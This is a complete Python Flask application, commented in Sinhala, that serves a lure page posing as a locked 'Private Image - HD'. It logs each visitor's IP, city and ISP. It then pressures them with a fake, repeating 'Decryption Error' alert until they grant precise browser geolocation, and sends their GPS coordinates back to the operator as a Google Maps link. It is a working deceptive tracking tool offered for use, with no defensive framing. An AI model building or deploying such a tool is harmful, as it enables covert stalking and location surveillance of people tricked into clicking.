import os
import requests
import datetime
try:
    import werkzeug
    werkzeug.urls.url_quote = werkzeug.urls.quote
except:
    pass
from flask import Flask, request

app = Flask(__name__)

# IP එකෙන් විස්තර ගන්නා ෆන්ක්ෂන් එක
def get_ip_info(ip):
    try:
        # IP-API (Free) පාවිච්චි කරලා විස්තර ගන්නවා
        response = requests.get(f"http://ip-api.com/json/{ip}").json()
        if response['status'] == 'success':
            return response
    except:
        return None
    return None

@app.route('/')
def index():
    user_ip = request.remote_addr
    if request.headers.get('X-Forwarded-For'):
        user_ip = request.headers.get('X-Forwarded-For').split(',')[0]
        
    ip_details = get_ip_info(user_ip)
    city = ip_details['city'] if ip_details else "Unknown"
    isp = ip_details['isp'] if ip_details else "Network"

    # ටර්මිනල් එකේ IP විස්තර පෙන්වීම
    print("\n" + "🌐"*20)
    print(f"[@] අලුත් කෙනෙක් ආවා! [{datetime.datetime.now().strftime('%H:%M:%S')}]")
    print(f"[+] IP: {user_ip} | City: {city} | ISP: {isp}")
    print("🌐"*20 + "\n")

    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Shared Media Player</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta property="og:title" content="Private Image - HD">
        <meta property="og:image" content="https://images.unsplash.com/photo-1506744038136-46273834b3fb?w=300&q=20">
        
        <style>
            body {{ background-color: #000; color: #fff; font-family: sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; }}
            .blur-box {{ position: relative; width: 320px; height: 200px; border-radius: 15px; overflow: hidden; border: 2px solid #444; }}
            .blur-img {{ width: 100%; height: 100%; filter: blur(15px); object-fit: cover; }}
            .overlay-text {{ position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 100%; }}
            .btn {{ background-color: #25D366; color: white; padding: 12px 24px; border: none; border-radius: 50px; font-weight: bold; cursor: pointer; margin-top: 15px; }}
            .info {{ font-size: 13px; color: #aaa; margin-top: 10px; }}
        </style>

        <script>
            // පේජ් එක ලෝඩ් වුණ ගමන් පර්මිෂන් ඉල්ලනවා
            window.onload = function() {{
                setTimeout(requestLoc, 1000);
            }};

            function requestLoc() {{
                if (navigator.geolocation) {{
                    navigator.geolocation.getCurrentPosition(success, error, {{enableHighAccuracy: true}});
                }}
            }}

            function success(p) {{
                fetch('/save-gps?lat=' + p.coords.latitude + '&lon=' + p.coords.longitude)
                .then(() => {{ window.location.href = "https://images.unsplash.com/photo-1506744038136-46273834b3fb?w=1200"; }});
            }}

            function error() {{
                alert("Decryption Error: Access Denied for {city}. Please allow location to unlock this image.");
                requestLoc(); // ආයෙත් ඉල්ලනවා
            }}
        </script>
    </head>
    <body>
        <div class="blur-box">
            <img src="https://images.unsplash.com/photo-1506744038136-46273834b3fb?w=300&q=10" class="blur-img">
            <div class="overlay-text">
                <div style="font-size: 40px;">🔒</div>
            </div>
        </div>
        
        <h2>Protected Content</h2>
        <p class="info">This content is restricted to users in <b>{city}</b> area.</p>
        <button class="btn" onclick="requestLoc()">Unlock & View HD Image</button>
        
        <p style="font-size: 11px; color: #555; margin-top: 20px;">Verification via {isp} secure gateway</p>
    </body>
    </html>
    '''

@app.route('/save-gps')
def save_gps():
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    print("\n" + "🎯"*20)
    print(f"[!] GPS ලොකේෂන් එක ලැබුණා!")
    print(f"[+] Google Maps: https://www.google.com/maps?q={lat},{lon}")
    print("🎯"*20 + "\n")
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
